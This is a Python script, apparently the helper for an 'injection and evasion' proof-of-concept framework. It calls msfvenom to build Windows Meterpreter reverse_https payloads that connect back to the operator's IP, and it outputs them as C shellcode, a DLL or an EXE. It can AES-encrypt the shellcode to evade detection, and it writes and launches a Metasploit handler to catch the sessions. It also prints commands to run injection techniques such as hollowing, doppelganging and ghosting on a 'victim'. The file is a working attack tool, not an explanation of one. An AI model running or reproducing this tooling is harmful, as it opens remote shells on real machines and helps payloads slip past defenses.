from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from os import urandom
import hashlib
import argparse
import subprocess
import sys
import socket
import io
from contextlib import redirect_stdout

# --- AES Encryption Functions ---
def AESencrypt(plaintext, key_bytes):
    k = hashlib.sha256(key_bytes).digest()
    iv = 16 * b'\x00'
    plaintext = pad(plaintext, AES.block_size)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext

def format_shellcode_array(data_bytes):
    formatted_bytes = [f'\\x{b:02x}' for b in data_bytes]
    lines = []
    bytes_per_line = 16
    for i in range(0, len(formatted_bytes), bytes_per_line):
        line_segment = ''.join(formatted_bytes[i:i+bytes_per_line])
        lines.append(f'"{line_segment}"')
    return '\n' + '\n'.join(lines) + ';'

def printResult(key_bytes, ciphertext):
    print('unsigned char AESkey[] =' + format_shellcode_array(key_bytes))
    print('unsigned char AESshellcode[] =' + format_shellcode_array(ciphertext))

# --- Default Configuration ---
LPORT = "4444"
PAYLOAD_SHELLCODE = "windows/x64/meterpreter/reverse_https"
PAYLOAD_DLL = "windows/x64/meterpreter/reverse_https"
PAYLOAD_EXE = "windows/x64/meterpreter/reverse_https"

TECHNIQUES = [
    "classic", "apc", "mapping", "stomping", "hollowing",
    "doppelganging", "tx_hollowing", "herpaderping", "ghosting", "dll"
]

def get_local_ip():
    """Automatically detects the active local IP address."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Connects to a dummy non-routable IP to force the OS to resolve the preferred local interface
        s.connect(('10.255.255.255', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def print_banner():
    print("""
    ================================================
          INJECTION & EVASION TEST FRAMEWORK
    ================================================
    """)

def generate_payload(target_format, payload_type, lhost):
    print(f"[*] Generating {payload_type} payload for {lhost}:{LPORT}...")

    cmd = [
        "msfvenom",
        "-p", payload_type,
        f"LHOST={lhost}",
        f"LPORT={LPORT}",
        "EXITFUNC=thread",
        "-f", target_format
    ]

    try:
        # Determine if msfvenom output will be text or binary for proper capture
        is_text_output = (target_format == 'c')
        result = subprocess.run(cmd, check=True, capture_output=True, text=is_text_output)
        return result.stdout
    except subprocess.CalledProcessError as e:
        error_msg = e.stderr if is_text_output else e.stderr.decode('utf-8', errors='ignore')
        print(f"[-] Error generating payload:\n{error_msg}")
        sys.exit(1)
    return None

def start_listener(lhost):
    print(f"[*] Starting Metasploit Listener on {lhost}:{LPORT}...")

    rc_content = f"""
use exploit/multi/handler
set PAYLOAD {PAYLOAD_SHELLCODE}
set LHOST {lhost}
set LPORT {LPORT}
set ExitOnSession false
set SessionCommunicationTimeout 300
set WfsDelay 30
run -j
    """

    with open("handler.rc", "w") as f:
        f.write(rc_content)

    try:
        subprocess.run(["msfconsole", "-q", "-r", "handler.rc"])
    except KeyboardInterrupt:
        print("\n[*] Exiting framework...")

def main():
    parser = argparse.ArgumentParser(description="Automate the Injection POC Framework")

    parser.add_argument("-s", "--shellcode", action="store_true", help="Generate and print C shellcode directly to the CLI")
    parser.add_argument("-g", "--generate-shellcode", action="store_true", help="Generate C shellcode array and save to file")
    parser.add_argument("-d", "--generate-dll", action="store_true", help="Generate malicious DLL")
    parser.add_argument("-e", "--generate-exe", action="store_true", help="Generate malicious standalone EXE")
    parser.add_argument("-l", "--listen", action="store_true", help="Start the Metasploit handler")
    parser.add_argument("-r", "--run-cmd", choices=TECHNIQUES, help="Show the command to run the C++ binary")
    parser.add_argument("--ip", type=str, help="Override the auto-detected IP address")
    parser.add_argument("--encrypt", action="store_true", help="Encrypt the generated C shellcode using AES") # NEW ARGUMENT

    args = parser.parse_args()
    print_banner()

    lhost = args.ip if args.ip else get_local_ip()

    action_requested = any([
        args.shellcode, args.generate_shellcode, args.generate_dll,
        args.generate_exe, args.listen
    ])

    if action_requested:
        print(f"[i] Using Attacker IP: {lhost}")

    if args.shellcode:
        if args.encrypt:
            raw_payload = generate_payload("raw", PAYLOAD_SHELLCODE, lhost)
            if raw_payload:
                key_bytes = urandom(16)
                encrypted_payload = AESencrypt(raw_payload, key_bytes)
                print("\n" + "="*50)
                print("            GENERATED ENCRYPTED SHELLCODE")
                print("="*50 + "\n")
                printResult(key_bytes, encrypted_payload)
                print("="*50 + "\n")
        else:
            # Original behavior for -s without encryption
            c_shellcode = generate_payload("c", PAYLOAD_SHELLCODE, lhost)
            if c_shellcode:
                c_shellcode = c_shellcode.replace("unsigned char buf[] =", "unsigned char shellcode[] =")
                print("\n" + "="*50)
                print("                GENERATED SHELLCODE")
                print("="*50 + "\n")
                print(c_shellcode)
                print("="*50 + "\n")

    elif args.generate_shellcode:
        if args.encrypt:
            raw_payload = generate_payload("raw", PAYLOAD_SHELLCODE, lhost)
            if raw_payload:
                key_bytes = urandom(16)
                encrypted_payload = AESencrypt(raw_payload, key_bytes)
                filename = "encrypted_payload.h"
                with open(filename, "w") as f:
                    # Capture stdout of printResult
                    f_out = io.StringIO()
                    with redirect_stdout(f_out):
                        printResult(key_bytes, encrypted_payload)
                    f.write(f_out.getvalue()) 
                print(f"[+] Encrypted shellcode saved to '{filename}'.")
                print("[i] Copy the AESkey and AESshellcode arrays from encrypted_payload.h into your main.cpp file.")
        else:
            # Original behavior for -g without encryption
            c_shellcode = generate_payload("c", PAYLOAD_SHELLCODE, lhost)
            if c_shellcode:
                c_shellcode = c_shellcode.replace("unsigned char buf[] =", "unsigned char shellcode[] =")
                filename = "payload.c"
                with open(filename, "w") as f:
                    f.write(c_shellcode)
                print(f"[+] Payload saved to '{filename}'.")
                print("[i] Copy the shellcode array from payload.c into your main.cpp file.")

    elif args.generate_dll:
        dll_payload = generate_payload("dll", PAYLOAD_DLL, lhost)
        if dll_payload:
            filename = "payload.dll"
            with open(filename, "wb") as f:
                f.write(dll_payload)
            print(f"[+] Payload saved to '{filename}'.")
    elif args.generate_exe:
        exe_payload = generate_payload("exe", PAYLOAD_EXE, lhost)
        if exe_payload:
            filename = "payload.exe"
            with open(filename, "wb") as f:
                f.write(exe_payload)
            print(f"[+] Payload saved to '{filename}'.")
    elif args.listen:
        start_listener(lhost)
    elif args.run_cmd:
        print(f"[*] To test this technique on the Windows victim, run:")
        if args.run_cmd == "dll":
            print(f"    .\\main.exe --technique {args.run_cmd} --dll C:\\Path\\To\\payload.dll")
        else:
            print(f"    .\\main.exe --technique {args.run_cmd}")
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
